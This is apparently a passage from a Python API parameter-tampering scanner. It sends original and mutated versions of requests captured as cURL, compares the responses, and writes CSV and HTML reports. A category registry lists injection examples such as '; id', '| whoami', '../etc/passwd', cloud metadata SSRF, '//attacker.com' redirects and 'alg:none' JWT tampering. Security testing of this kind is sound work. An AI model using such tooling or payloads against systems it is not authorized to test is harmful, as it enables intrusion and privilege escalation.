    for _lk, (k, v) in headers.items():
        lines.append(f"  -H {_curl_arg(f'{k}: {v}')}")

    body = getattr(entry, "body", None)
    body_type = getattr(entry, "body_type", None)
    if body is not None and body != "":
        if body_type == "json" and not isinstance(body, str):
            body_str = json.dumps(body, separators=(",", ":"), ensure_ascii=False)
        elif body_type == "form" and isinstance(body, dict):
            body_str = urlencode(body)
        else:
            body_str = str(body)
        if body_str:
            if body_type == "json" and "content-type" not in headers:
                lines.append(f"  -H {_curl_arg('Content-Type: application/json')}")
            lines.append(f"  --data-raw {_curl_arg(body_str)}")
    return " \\\n".join(lines)


def generate_tasks(session, bearer, timeout, verbose, delay, entry,
                   selected_params=None, random_formats=None,
                   context_aware=False, csrf_refresher=None,
                   category_override=None):
    """
    Build mutation tasks from a single CURLEntry.
    selected_params : list of (source, param_name) to tamper.
                      If None, all params are tampered.
    random_formats  : dict {param_name: format_string} for mandatory
                      unique fields that must be fresh each request.
    context_aware   : if True, filter mutations by infer_mutation_categories.
    csrf_refresher  : optional CsrfRefresher instance, passed through to tasks.
    """
    tasks = []
    params_set = set()
    flat = entry.all_params_flat()

    selected_set = None
    if selected_params is not None:
        selected_set = set((s, p) for s, p in selected_params)

    for source, param_name, orig_value in entry.all_params():
        if selected_set is not None and (source, param_name) not in selected_set:
            continue
        params_set.add(param_name)
        if category_override is not None:
            categories = category_override
        elif context_aware:
            categories = infer_mutation_categories(param_name, orig_value)
        else:
            categories = None
        for mutation_label, mutated_value in get_mutations(param_name, orig_value, flat, categories=categories):
            me = deepcopy(entry)
            _apply_special_mutation(
                me, entry, source, param_name, orig_value,
                mutation_label, mutated_value,
            )

            tasks.append((
                session, bearer, timeout, verbose, delay,
                entry, source, param_name, orig_value,
                mutation_label, mutated_value, me,
                random_formats or {}, csrf_refresher,
            ))

    return tasks, len(params_set)


def run_test(task):
    (session, bearer, timeout, verbose, delay,
     entry, source, param_name, orig_value,
     mutation_label, mutated_value, mutated_entry,
     random_formats, csrf_refresher) = task

    if delay and delay > 0:
        time.sleep(delay)

    orig_entry    = apply_random_formats(deepcopy(entry), random_formats)
    mutated_entry = apply_random_formats(mutated_entry, random_formats)

    if csrf_refresher:
        orig_entry    = csrf_refresher.apply(orig_entry)
        mutated_entry = csrf_refresher.apply(deepcopy(mutated_entry))

    t0 = time.time()
    orig_resp = send_request(
        session, orig_entry.method, orig_entry.url,
        orig_entry.headers, orig_entry.query_params,
        orig_entry.body, orig_entry.body_type, bearer, timeout,
    )
    t1 = time.time()
    mut_resp = send_request(
        session, mutated_entry.method, mutated_entry.url,
        mutated_entry.headers, mutated_entry.query_params,
        mutated_entry.body, mutated_entry.body_type, bearer, timeout,
    )
    t2 = time.time()

    o = snap(orig_resp)
    m = snap(mut_resp)
    c = compare(
        o, m,
        mutation_label=mutation_label,
        payload=str(mutated_value),
        elapsed_orig=(t1 - t0),
        elapsed_mut=(t2 - t1),
        timeout=timeout,
    )

    if verbose:
        conf_icon = {
            "Confirmed": "⚡", "Likely": "🔴", "Possible": "🟠", "No Issue": "🟢"
        }.get(c["confidence"], "⚪")
        print(f"  {conf_icon} [{c['confidence']:9}|{c['risk_level']:12}] "
              f"{entry.method:<6} {entry.path} | {param_name} | "
              f"{mutation_label} | {o['status']}→{m['status']}")

    return {
        "url":            entry.url,
        "method":         entry.method,
        "param_name":     param_name,
        "param_source":   source,
        "orig_value":     str(orig_value),
        "mutation_type":  mutation_label,
        "mut_value":      str(mutated_value)[:300],
        "orig_status":    o["status"],
        "mut_status":     m["status"],
        "status_changed": c["status_changed"],
        "orig_length":    o["length"],
        "mut_length":     m["length"],
        "diff_pct":       c["diff_pct"],
        "body_changed":   c["body_changed"],
        "risk_level":     c["risk_level"],
        "confidence":     c["confidence"],
        "evidence":       c["evidence"],
        "time_delta":     c["time_delta"],
        "keywords":       c["keywords"],
        "sql_disclosure": bool(c.get("sql_disclosure")),
        "orig_request":   req_repr(
            orig_entry.method, orig_entry.url, orig_entry.headers,
            orig_entry.body, orig_entry.body_type,
        ),
        "mut_request":    req_repr(
            mutated_entry.method, mutated_entry.url,
            mutated_entry.headers, mutated_entry.body,
            mutated_entry.body_type,
        ),
        "orig_curl":      entry_to_curl(orig_entry, bearer),
        "mut_curl":       entry_to_curl(mutated_entry, bearer),
        "orig_request_body_json": clip_dump(
            json.dumps(orig_entry.body, indent=2)
            if orig_entry.body_type == "json"
               and isinstance(orig_entry.body, (dict, list))
            else str(orig_entry.body or ""),
            REQ_BODY_LIMIT,
        ),
        "mut_request_body_json": clip_dump(
            json.dumps(mutated_entry.body, indent=2)
            if mutated_entry.body_type == "json"
               and isinstance(mutated_entry.body, (dict, list))
            else str(mutated_entry.body or ""),
            REQ_BODY_LIMIT,
        ),
        "orig_response":  o["text"][:2000],
        "mut_response":   m["text"][:2000],
    }



# ---------------------------------------------------------------------------
#  RANDOM VALUE GENERATOR  (for mandatory/unique fields)
# ---------------------------------------------------------------------------

import random as _random
import string as _string

_FIRST_NAMES = ["Alice", "Bob", "Carol", "Dave", "Eva", "Frank", "Grace",
                "Hank", "Iris", "Jack", "Karen", "Leo", "Mia", "Nick"]
_LAST_NAMES  = ["Smith", "Jones", "Brown", "Davis", "Wilson", "Moore",
                "Taylor", "Anderson", "Thomas", "White", "Harris", "Martin"]


def generate_random_value(fmt):
    """
    Resolve format tokens in fmt string to random values.
    Tokens:
      {alpha:N}    → N random letters
      {alphanum:N} → N random letters+digits
      {num:N}      → N random digits
      {uuid}       → random UUID
      {email}      → random email  e.g. abc123@testapi.com
      {name}       → random full name
    Anything else is kept as-is literal text.
    """
    import uuid as _uuid

    def _replace(m):
        token = m.group(1).lower().strip()
        if token == "uuid":
            return str(_uuid.uuid4())
        if token == "email":
            user = ''.join(_random.choices(_string.ascii_lowercase + _string.digits, k=8))
            return f"{user}@testapi.com"
        if token == "name":
            return f"{_random.choice(_FIRST_NAMES)} {_random.choice(_LAST_NAMES)}"
        parts = token.split(":")
        kind  = parts[0]
        n     = int(parts[1]) if len(parts) > 1 else 8
        if kind == "alpha":
            return ''.join(_random.choices(_string.ascii_letters, k=n))
        if kind == "alphanum":
            return ''.join(_random.choices(_string.ascii_letters + _string.digits, k=n))
        if kind == "num":
            return ''.join(_random.choices(_string.digits, k=n))
        return m.group(0)

    return re.sub(r'\{([^}]+)\}', _replace, fmt)


def apply_random_formats(entry, random_formats):
    """Apply random_formats overrides to a CURLEntry (fresh value each call)."""
    if not random_formats:
        return entry
    for param_name, fmt in random_formats.items():
        fresh_val = generate_random_value(fmt)
        if param_name in (entry.query_params or {}):
            entry.query_params[param_name] = fresh_val
        elif isinstance(entry.body, dict) and param_name in entry.body:
            entry.body[param_name] = fresh_val
        elif "." in param_name and isinstance(entry.body, dict):
            parent, _, child = param_name.partition(".")
            if parent in entry.body and isinstance(entry.body[parent], dict):
                entry.body[parent][child] = fresh_val
    return entry


# ---------------------------------------------------------------------------
#  INTERACTIVE SELECTION HELPERS
# ---------------------------------------------------------------------------

def _print_params_table(all_params):
    """Print a numbered table of all discovered parameters. Returns index list."""
    print()
    print("  ┌──────┬────────────────┬─────────────────────────────────────────┐")
    print("  │  #   │  Source        │  Parameter Name              (cur value) │")
    print("  ├──────┼────────────────┼─────────────────────────────────────────┤")
    index = []
    for source, param_name, orig_value in all_params:
        index.append((source, param_name, orig_value))
        n   = len(index)
        v   = str(orig_value)[:16]
        src = source[:14]
        print(f"  │  {n:<3} │  {src:<14} │  {param_name:<28}  ({v}) │")
    print("  └──────┴────────────────┴─────────────────────────────────────────┘")
    return index


# Full category registry — used for Manual Select Scan
ALL_CATEGORIES = {
    1:  ("01_bool",    "Boolean Flip",              "true↔false, enabled↔disabled, yes↔no"),
    2:  ("02_status",  "Status/State Escalation",   "pending→approved, draft→published"),
    3:  ("03_role",    "Role/Privilege Escalation",  "user→admin, viewer→owner"),
    4:  ("04_num",     "Numeric Boundary",           "±1, 0, -1, max_int32, overflow"),
    5:  ("05_uuid",    "UUID/GUID Tamper",           "random, zeros, ones, sequential"),
    6:  ("06_idor",    "IDOR Core",                  "id±1/100, null, *, -1, hex"),
    7:  ("07_mass",    "IDOR Mass Assignment",        "inject owner_id/is_admin into body"),
    8:  ("08_idor",    "IDOR Reference Swap",         "swap values between ID params"),
    9:  ("09_scope",   "IDOR Scope Escalation",       "org_id, tenant_id, workspace_id"),
    10: ("10_ssrf",    "SSRF",                        "AWS metadata, localhost, file://"),
    11: ("11_sqli",    "SQL Injection",               "error, UNION, blind, time-based, NoSQL"),
    12: ("11b_cmdi",   "OS Command Injection",        "; id, | whoami, $(id), sleep"),
    13: ("12_xss",     "XSS",                         "script, onerror, svg, polyglot"),
    14: ("13_ssti",    "SSTI",                        "Jinja2, Twig, FreeMarker, ERB"),
    15: ("14_path",    "Path Traversal",              "../etc/passwd, encoded, null-byte"),
    16: ("15_null",    "Null / Empty / Undefined",    "null, None, undefined, empty, NaN"),
    17: ("16_ws",      "Whitespace Bypass",           "leading/trailing space, tab, NBSP"),
    18: ("17_case",    "Case Mutation",               "UPPER, lower, Capitalize, MiXeD"),
    19: ("18_role",    "Role String Injection",        "&role=admin, &isAdmin=true appended"),
    20: ("19_neg",     "Negative Logic Bypass",        "not_, un, dis, !, ~ prefix"),
    21: ("20_arr",     "Array / Multi-value",          "param[]=val, JSON array, CSV"),
    22: ("21_hpp",     "HTTP Parameter Pollution",     "duplicate param with admin/true"),
    23: ("22_fmt",     "Format String",               "%s%s, {0}, ${7*7}, #{7*7}"),
    24: ("23_type",    "Type Confusion",               "str→int, int→bool, JSON null"),
    25: ("24_len",     "Long Value / Buffer",          "256 / 1024 / 4096 chars"),
    26: ("25_sc",      "Special Characters",           "; | & ` $() CRLF RTL %00 {}"),
    27: ("26_biz",     "Business Logic",               "zero price, negative qty, date bypass"),
    28: ("27_proto",   "JSON Key / Prototype Inject",  "__proto__, $where, $gt, $ne"),
    29: ("28_xff",     "Header / Host Injection",       "X-Forwarded-For, Host spoof"),
    30: ("29_enc",     "Encoding Bypass",              "base64, double URL encode, hex"),
    31: ("30_auth",    "Auth Token Tamper",             "alg:none JWT, claim inject, no-sig"),
    32: ("31_xxe",     "XXE (XML External Entity)",    "file://, SSRF, OOB, PHP filter"),
    33: ("32_redir",   "Open Redirect",                "//attacker.com, encoded, CRLF"),
    34: ("33_ldap",    "LDAP Injection",               "* wildcard, OR bypass, blind"),
    35: ("34_crlf",    "CRLF Injection",               "\\r\\n header inject, response split"),
    36: ("35_deser",   "Insecure Deserialization",      "PHP, Python pickle, Java, Ruby YAML"),
    37: ("36_redos",   "ReDoS",                        "catastrophic backtracking patterns"),
    38: ("37_xpath",   "XPath Injection",              "or '1'='1, blind, extract"),
    39: ("38_gql",     "GraphQL Injection",            "introspect, depth bomb, alias DoS"),
}

# Grouped shortcuts for quick selection
CATEGORY_GROUPS = {
    "injection":   [11, 12, 13, 14, 23, 34, 35, 36, 37, 38, 39],
    "idor":        [6, 7, 8, 9],
    "auth":        [1, 2, 3, 19, 31],
    "web":         [13, 15, 17, 22, 35],
    "api":         [4, 5, 6, 7, 10, 11, 24, 27, 28, 29, 31],
    "logic":       [1, 2, 3, 19, 20, 27],
    "recon":       [16, 23, 24, 25, 26],
}


def _ask_category_selection():
    """
    Step 2 (Manual mode) — Ask which vulnerability categories to test.
    Returns a set of category prefix strings, or None (= all categories).
    """
    print()
    print("  ┌──────────────────────────────────────────────────────────────────────┐")
    print("  │  Step 2 — Select VULNERABILITY CATEGORIES to test                   │")
    print("  │  Press ENTER = all categories  |  Type numbers or group name        │")
    print("  ├──────────────────────────────────────────────────────────────────────┤")
    print("  │  QUICK GROUPS:  injection  idor  auth  web  api  logic  recon       │")
    print("  └──────────────────────────────────────────────────────────────────────┘")
    print()

    # Print categories in 2-column layout
    items = list(ALL_CATEGORIES.items())
    mid   = (len(items) + 1) // 2
    left  = items[:mid]
    right = items[mid:]
    for (ln, (lp, lname, _ldesc)), (rn, (rp, rname, _rdesc)) in zip(left, right):
        print(f"  {ln:>3}. {lname:<30}   {rn:>3}. {rname}")
    if len(left) > len(right):
        ln, (lp, lname, _) = left[-1]
        print(f"  {ln:>3}. {lname}")
    print()

    while True:
        raw = input("  → ").strip().lower()
        if raw == "":
            print("  [*] All 39 categories selected.")
            return None  # None = all categories

        # Group shortcut
        if raw in CATEGORY_GROUPS:
            picks = CATEGORY_GROUPS[raw]
            selected = {ALL_CATEGORIES[p][0] for p in picks}
            names    = ", ".join(ALL_CATEGORIES[p][1] for p in picks)
            print(f"  [*] Group '{raw}': {names}")
            return selected

        # Numeric selection
        try:
            picks    = [int(x.strip()) for x in raw.replace(",", " ").split() if x.strip()]
            selected = set()
            for p in picks:
                if p in ALL_CATEGORIES:
                    selected.add(ALL_CATEGORIES[p][0])
                else:
                    print(f"  [!] {p} not in range — skipped")
            if selected:
                names = ", ".join(
                    ALL_CATEGORIES[p][1] for p in picks if p in ALL_CATEGORIES
                )
                print(f"  [*] Selected: {names}")
                return selected
            print("  [-] No valid selection. Try again.")
        except ValueError:
            # Maybe they typed a partial group name
            matches = [g for g in CATEGORY_GROUPS if raw in g]
            if matches:
                picks    = CATEGORY_GROUPS[matches[0]]
                selected = {ALL_CATEGORIES[p][0] for p in picks}
                print(f"  [*] Matched group '{matches[0]}'")
                return selected
            print("  [-] Enter numbers (e.g. 11,12,13), a group name, or ENTER for all.")


def _ask_tamper_selection(index):
    """Step 1 — ask which params to TAMPER. Returns list of (source, param_name)."""
    print()
    print("  Step 1 — Select parameters to TAMPER:")
    print("  Enter numbers (comma-separated), or press ENTER for all:")
    print()
    while True:
        raw = input("  → ").strip()
        if raw == "":
            return [(s, p) for s, p, _ in index]
        try:
            picks  = [int(x.strip()) for x in raw.split(",") if x.strip()]
            chosen = []
            for p in picks:
                if 1 <= p <= len(index):
                    chosen.append((index[p - 1][0], index[p - 1][1]))
                else:
                    print(f"  [!] {p} out of range — skipped")
            if chosen:
                return chosen
            print("  [-] No valid selection. Try again.")
        except ValueError:
            print("  [-] Enter numbers only, e.g.: 1,3,5")


def _ask_random_formats(index, selected_params):
    """
    Step 2 — Ask which OTHER params need unique/random values per request.
    Returns dict {param_name: format_string}.
    """
    selected_names = {p for _, p in selected_params}
    others = [(s, p, v) for s, p, v in index if p not in selected_names]

    if not others:
        return {}

    print()
    print("  ┌──────────────────────────────────────────────────────────────────┐")
    print("  │  Step 2 — Mandatory / Unique Fields                              │")
    print("  │  Any field that must be UNIQUE per request?                      │")
    print("  │  (e.g. name, email, code — duplicates may cause 422 errors)      │")
    print("  └──────────────────────────────────────────────────────────────────┘")
    print()
    print("  Format tokens:")
    print("    {alpha:N}    → N random letters        e.g. {alpha:6}    → xkqtbm")
    print("    {alphanum:N} → N letters + digits      e.g. {alphanum:8} → xK7q2Bm9")
    print("    {num:N}      → N digits                e.g. {num:5}      → 38472")
    print("    {uuid}       → random UUID")
    print("    {email}      → random email            e.g. abc8@testapi.com")
    print("    {name}       → random full name        e.g. Alice Smith")
    print("    Mix freely:  test_{alphanum:6}   or   {alpha:5}@company.com")
    print()

    formats   = {}
    remaining = list(others)

    while True:
        print("  ┌───────────────────────────────────────────────────────────────┐")
        if formats:
            print(f"  │  Configured ({len(formats)}):                                         │")
            for k, v in formats.items():
                prev = generate_random_value(v)[:14]
                print(f"  │    {k:<30} → {v:<16} (e.g. {prev})│")
            print("  ├───────────────────────────────────────────────────────────────┤")

        avail = [(i + 1, s, p, v2) for i, (s, p, v2) in enumerate(remaining)
                 if p not in formats]
        if not avail:
            print("  │  All parameters configured.                                   │")
            print("  └───────────────────────────────────────────────────────────────┘")
            break

        print("  │  Available parameters:                                        │")
        for n, s, p, v2 in avail:
            print(f"  │    {n:<4} [{s:<12}]  {p:<38}│")
        print("  └───────────────────────────────────────────────────────────────┘")
        print()
        print("  Enter parameter number, or type  'skip'  if no unique fields needed:")
        print()

        raw = input("  → ").strip().lower()
        if raw in ("skip", "s", ""):
            break

        try:
            pick  = int(raw)
            match = next(((s, p) for n, s, p, v2 in avail if n == pick), None)
            if not match:
                print(f"  [!] {pick} not in list. Try again.\n")
                continue
            src, pname = match
        except ValueError:
            print("  [!] Enter a number or 'skip'.\n")
            continue

        while True:
            fmt = input(f"\n  Format for '{pname}': ").strip()
            if not fmt:
                print("  [!] Format cannot be empty.")
                continue

            has_token = bool(re.search(r'\{[^}]+\}', fmt))
            preview   = generate_random_value(fmt)
            print(f"  Preview → {preview}")

            if not has_token:
                print(f"\n  ⚠  WARNING: no random token — every request will send the same value: '{fmt}'")
                print(f"     Suggestion: {fmt}_{{alphanum:6}} → {fmt}_{generate_random_value('{alphanum:6}')}")
                confirm = input("\n  Proceed with static value anyway? (y/n): ").strip().lower()
            else:
                confirm = input("  Use this format? (y/n): ").strip().lower()

            if confirm in ("y", "yes"):
                formats[pname] = fmt
                print(f"  [✓] '{pname}' → {fmt}\n")
                break
            print("  Re-enter format.\n")

    if formats:
        print(f"\n  [*] Random formats configured: {', '.join(formats.keys())}")
    else:
        print("  [*] No random formats set — original cURL values will be used.")
    print()
    return formats


# ---------------------------------------------------------------------------
#  CSV REPORT
# ---------------------------------------------------------------------------

def write_csv(output_path, findings):
    """Write a flat CSV report — easy to open in Excel / Google Sheets."""
    field_map = [
        ("url",            "URL"),
        ("method",         "Method"),
        ("param_source",   "Param Source"),
        ("param_name",     "Parameter Name"),
        ("orig_value",     "Original Value"),
        ("mutation_type",  "Mutation Category"),
        ("mut_value",      "Modified Value"),
        ("orig_status",    "Original Status"),
        ("mut_status",     "Modified Status"),
        ("status_changed", "Status Changed"),
        ("orig_length",    "Original Length (bytes)"),
        ("mut_length",     "Modified Length (bytes)"),
        ("diff_pct",       "Length Diff % (normalized)"),
        ("body_changed",   "Response Body Changed"),
        ("risk_level",     "Risk Level"),
        ("confidence",     "Confidence"),
        ("evidence",       "Evidence"),
        ("time_delta",     "Time Delta (s)"),
        ("keywords",       "Sensitive Keywords Found"),
        ("orig_request",            "Original Request (cURL-style)"),
        ("mut_request",             "Mutated Request (cURL-style)"),
        ("orig_request_body_json",  "Original Request Body (JSON)"),
        ("mut_request_body_json",   "Mutated Request Body (JSON)"),
        ("orig_response",           "Original Response Body"),
        ("mut_response",            "Mutated Response Body"),
    ]
    fields  = [f for f, _ in field_map]
    headers = [h for _, h in field_map]

    # Filter out any blank/None entries that can appear from threading edge-cases
    valid_findings = [f for f in findings if f and f.get("param_name")]

    with open(output_path, "w", newline="", encoding="utf-8-sig") as fh:
        writer = csv.writer(fh)
        writer.writerow(headers)
        for f in valid_findings:
            writer.writerow([f.get(field, "") for field in fields])

    print(f"[OK] CSV report  → {output_path}")


# ---------------------------------------------------------------------------
#  HTML REPORT
# ---------------------------------------------------------------------------

def generate_html(findings, summary, output_path):
    now_str = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    high_f  = [f for f in findings if f["risk_level"] == "High Risk"]
    med_f   = [f for f in findings if f["risk_level"] == "Medium Risk"]
    clean_f = [f for f in findings if f["risk_level"] == "No Issue"]

    def esc(s):
        return (str(s)
                .replace("&", "&amp;")
                .replace("<", "&lt;")
                .replace(">", "&gt;")
                .replace('"', "&quot;"))

    def risk_badge(r):
        col = {"High Risk": "#da3633", "Medium Risk": "#d29922",
               "No Issue": "#238636"}.get(r, "#444")
        return (f"<span style='background:{col};color:#fff;border-radius:4px;"
                f"padding:2px 8px;font-size:11px;font-weight:700'>{esc(r)}</span>")

    def confidence_badge(c):
        col  = {"Confirmed": "#8957e5", "Likely": "#da3633",
                "Possible": "#d29922",  "No Issue": "#444"}.get(c, "#444")
        icon = {"Confirmed": "⚡", "Likely": "🔴",
                "Possible": "🟠",  "No Issue": "🟢"}.get(c, "")
        return (f"<span style='background:{col};color:#fff;border-radius:4px;"
                f"padding:2px 7px;font-size:10px;font-weight:700'>{icon} {esc(c)}</span>")

    def status_badge(code):
        try:
            c = int(code)
            color = ("#238636" if 200 <= c < 300
                     else "#d29922" if 300 <= c < 400
                     else "#da3633")
        except Exception:
            color = "#6e7681"
        return (f"<span style='background:{color};color:#fff;border-radius:4px;"
                f"padding:2px 7px;font-size:11px;font-weight:700'>{esc(code)}</span>")

    def evidence_pills(ev_str):
        if not ev_str:
            return "<span style='color:#6e7681;font-size:10px'>—</span>"
        pills = []
        for chunk in ev_str.split(" | "):
            chunk = chunk.strip()
            if not chunk:
                continue
            col = "#5a1e1e"
            if chunk.startswith("time_delay"):      col = "#1a1060"
            elif chunk.startswith("ssti"):           col = "#3d1a5a"
            elif chunk.startswith("status_upgrade"): col = "#1a3a0d"
            elif chunk.startswith("leak"):           col = "#5a1e1e"
            elif chunk.startswith("reflected"):      col = "#3a1e0d"
            elif chunk.startswith("priv") or chunk.startswith("new_priv"): col = "#1a1e5a"
            elif chunk.startswith("array_grew"):     col = "#1a3a3a"
            elif chunk.startswith("body_grew"):      col = "#2a2a00"
            elif chunk.startswith("[fp_suppressed"): col = "#2a2a2a"
            pills.append(
                f"<span style='background:{col};color:#c9d1d9;border-radius:3px;"
                f"padding:1px 5px;font-size:9px;margin:1px;display:inline-block;"
                f"white-space:nowrap'>{esc(chunk[:70])}</span>"
            )
        return " ".join(pills)

    def detail_row(idx, f):
        rid = f"row{idx}"
        kw_html = (
            f"<span style='background:#5a1e1e;color:#ff7b72;border-radius:3px;"
            f"padding:1px 6px;font-size:10px;margin:1px;display:inline-block'>"
            f"{esc(k)}</span>"
            for k in f["keywords"].split(", ") if k
        ) if f.get("keywords") else []
        kw_block = (
            " ".join(kw_html) if f.get("keywords")
            else "<span style='color:#6e7681;font-size:10px'>none</span>"
        )

        status_arrow  = f"{status_badge(f['orig_status'])} → {status_badge(f['mut_status'])}"
        changed_icon  = "✓ Same" if f["status_changed"] == "No" else "⚠️ Changed"
        changed_col   = "#238636" if f["status_changed"] == "No" else "#da3633"
        row_bg        = {"High Risk": "#1a0505", "Medium Risk": "#1a1200",
                         "No Issue": ""}.get(f["risk_level"], "")
        src_badge_col = {"query": "#1f6feb", "body": "#388bfd",
                         "body_nested": "#79c0ff"}.get(f.get("param_source", ""), "#444")
        time_delta    = f.get("time_delta", 0)
        time_str      = (f"<span style='color:#8957e5;font-size:10px'>{time_delta}s</span>"
                         if time_delta and float(time_delta) >= 4.0
                         else f"<span style='color:#6e7681;font-size:10px'>{time_delta}s</span>")

        return f"""
<tr style='background:{row_bg}'>
  <td style='color:#6e7681;font-size:11px'>{idx}</td>
  <td>{risk_badge(f['risk_level'])}</td>
  <td>{confidence_badge(f.get('confidence','—'))}</td>
  <td style='font-size:11px;color:#79c0ff;font-weight:600'>{esc(f['method'])}</td>
  <td style='font-size:11px;color:#c9d1d9;word-break:break-all;max-width:180px'>{esc(f['url'])}</td>
  <td><span style='background:{src_badge_col};color:#fff;border-radius:3px;padding:1px 5px;font-size:10px'>{esc(f.get('param_source',''))}</span></td>
  <td><code style='font-size:11px;color:#ffa657'>{esc(f['param_name'])}</code></td>
  <td style='font-size:11px;color:#8b949e'>{esc(f['orig_value'])}</td>
  <td style='font-size:11px;color:#ff7b72'>{esc(str(f['mut_value'])[:60])}</td>
  <td style='font-size:11px;color:#e3b341'>{esc(f['mutation_type'])}</td>
  <td style='font-size:11px'>{status_arrow}</td>
  <td style='font-size:11px;color:{changed_col}'>{changed_icon}</td>
  <td style='font-size:11px'>{esc(f['diff_pct'])}%</td>
  <td style='font-size:11px'>{time_str}</td>
  <td style='font-size:11px'>{kw_block}</td>
  <td style='font-size:11px;max-width:260px'>{evidence_pills(f.get('evidence',''))}</td>
  <td style='font-size:11px'>
    <button onclick="toggleDetail('{rid}')"
      style='background:#21262d;color:#79c0ff;border:1px solid #30363d;
             border-radius:4px;padding:3px 10px;cursor:pointer;font-size:10px'>
      ▼ Details
    </button>
  </td>
</tr>
<tr id="{rid}" style='display:none;background:#0d1117'>
  <td colspan='17'>
    <div style='padding:10px 14px'>
      <div style='font-size:11px;font-weight:700;color:#8957e5;margin-bottom:6px'>
        🔬 Evidence &nbsp;
        <span style='font-weight:400;color:#6e7681'>{esc(f.get('evidence','none'))}</span>
      </div>
    </div>
    <div style='display:grid;grid-template-columns:1fr 1fr;gap:12px;padding:0 14px 14px'>
      <div>
        <div style='font-size:11px;font-weight:700;color:#58a6ff;margin-bottom:4px'>
          📤 Original Request</div>
        <pre style='font-size:10px;color:#8b949e;background:#0d1117;border:1px solid #21262d;
        border-radius:4px;padding:8px;white-space:pre-wrap;max-height:200px;overflow:auto'>{esc(f.get('orig_request',''))}</pre>
        <div style='font-size:11px;font-weight:700;color:#58a6ff;margin:8px 0 4px'>
          📥 Original Response <span style='font-weight:400;color:#6e7681'>({esc(f['orig_length'])} bytes)</span></div>
        <pre style='font-size:10px;color:#8b949e;background:#0d1117;border:1px solid #21262d;
        border-radius:4px;padding:8px;white-space:pre-wrap;max-height:200px;overflow:auto'>{esc(f.get('orig_response',''))}</pre>
      </div>
      <div>
        <div style='font-size:11px;font-weight:700;color:#ff7b72;margin-bottom:4px'>
          📤 Mutated Request — <span style='color:#e3b341'>{esc(f['mutation_type'])}</span>
          <span style='color:#6e7681;font-weight:400'> | changed: <code style='color:#ffa657'>{esc(f['param_name'])}</code>
          = <code style='color:#ff7b72'>{esc(str(f['mut_value'])[:80])}</code></span></div>
        <pre style='font-size:10px;color:#ffa657;background:#0d1117;border:1px solid #3d1f00;
        border-radius:4px;padding:8px;white-space:pre-wrap;max-height:200px;overflow:auto'>{esc(f.get('mut_request',''))}</pre>
        <div style='font-size:11px;font-weight:700;color:#ff7b72;margin:8px 0 4px'>
          📥 Mutated Response <span style='font-weight:400;color:#6e7681'>({esc(f['mut_length'])} bytes)
          &nbsp;·&nbsp; ⏱ {esc(f.get('time_delta',0))}s</span></div>
        <pre style='font-size:10px;color:#ffa657;background:#0d1117;border:1px solid #3d1f00;
        border-radius:4px;padding:8px;white-space:pre-wrap;max-height:200px;overflow:auto'>{esc(f.get('mut_response',''))}</pre>
      </div>
    </div>
  </td>
</tr>"""

    def section(title, icon, items, color):
        if not items:
            return f"""
<div style='margin-bottom:20px'>
  <h2 style='font-size:13px;font-weight:700;padding:10px 14px;background:#0d1117;
             border-left:3px solid {color};border-radius:6px 6px 0 0;color:{color};margin:0'>
    {icon} {esc(title)}</h2>
  <div style='background:#0d1117;border:1px solid #21262d;border-top:none;
              border-radius:0 0 6px 6px;padding:14px;color:#3fb950;font-size:12px'>
    ✅ No findings in this category.</div>
</div>"""

        rows_html = "".join(detail_row(i + 1, f) for i, f in enumerate(items))
        return f"""
<div style='margin-bottom:20px'>
  <h2 style='font-size:13px;font-weight:700;padding:10px 14px;background:#0d1117;
             border-left:3px solid {color};border-radius:6px 6px 0 0;color:{color};margin:0'>
    {icon} {esc(title)}
    <span style='font-weight:400;color:#6e7681'>
      ({len(items)} finding{"s" if len(items) != 1 else ""})</span></h2>
  <div style='overflow-x:auto;border:1px solid #21262d;border-top:none;border-radius:0 0 6px 6px'>
  <table style='border-collapse:collapse;width:100%;background:#0d1117;font-size:12px'>
    <tr style='background:#161b22'>
      <th style='padding:7px 10px;color:#6e7681;font-size:10px;text-align:left;white-space:nowrap'>#</th>
      <th style='padding:7px 10px;color:#6e7681;font-size:10px;text-align:left;white-space:nowrap'>RISK</th>
      <th style='padding:7px 10px;color:#6e7681;font-size:10px;text-align:left;white-space:nowrap'>CONFIDENCE</th>
      <th style='padding:7px 10px;color:#6e7681;font-size:10px;text-align:left;white-space:nowrap'>METHOD</th>
      <th style='padding:7px 10px;color:#6e7681;font-size:10px;text-align:left;white-space:nowrap'>URL</th>
      <th style='padding:7px 10px;color:#6e7681;font-size:10px;text-align:left;white-space:nowrap'>SOURCE</th>
      <th style='padding:7px 10px;color:#6e7681;font-size:10px;text-align:left;white-space:nowrap'>PARAM</th>
      <th style='padding:7px 10px;color:#6e7681;font-size:10px;text-align:left;white-space:nowrap'>ORIG VALUE</th>
      <th style='padding:7px 10px;color:#6e7681;font-size:10px;text-align:left;white-space:nowrap'>MUTATED VALUE</th>
      <th style='padding:7px 10px;color:#6e7681;font-size:10px;text-align:left;white-space:nowrap'>MUTATION</th>
      <th style='padding:7px 10px;color:#6e7681;font-size:10px;text-align:left;white-space:nowrap'>STATUS</th>
      <th style='padding:7px 10px;color:#6e7681;font-size:10px;text-align:left;white-space:nowrap'>CHANGED</th>
      <th style='padding:7px 10px;color:#6e7681;font-size:10px;text-align:left;white-space:nowrap'>DIFF%</th>
      <th style='padding:7px 10px;color:#6e7681;font-size:10px;text-align:left;white-space:nowrap'>TIME</th>
      <th style='padding:7px 10px;color:#6e7681;font-size:10px;text-align:left;white-space:nowrap'>KEYWORDS</th>
      <th style='padding:7px 10px;color:#6e7681;font-size:10px;text-align:left;white-space:nowrap'>EVIDENCE</th>
      <th style='padding:7px 10px;color:#6e7681;font-size:10px;text-align:left;white-space:nowrap'></th>
    </tr>
    {rows_html}
  </table>
  </div>
</div>"""

    html = f"""<!DOCTYPE html><html><head>
<meta charset='utf-8'><title>Parameter Tampering Report — cURL Edition</title>
<style>
  @import url('https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;700&family=Space+Grotesk:wght@400;600;700&display=swap');
  *{{box-sizing:border-box;margin:0;padding:0}}
  body{{font-family:'Space Grotesk',sans-serif;background:#080c10;color:#c9d1d9;padding:24px;
       background-image:radial-gradient(ellipse at 5% 10%,#1c0606 0%,transparent 45%),
                        radial-gradient(ellipse at 95% 90%,#06060c 0%,transparent 40%)}}
  .wrap{{max-width:1900px;margin:0 auto}}
  h1{{font-size:24px;font-weight:700;margin-bottom:4px;
      background:linear-gradient(135deg,#da3633,#f85149,#ffa657);
      -webkit-background-clip:text;-webkit-text-fill-color:transparent}}
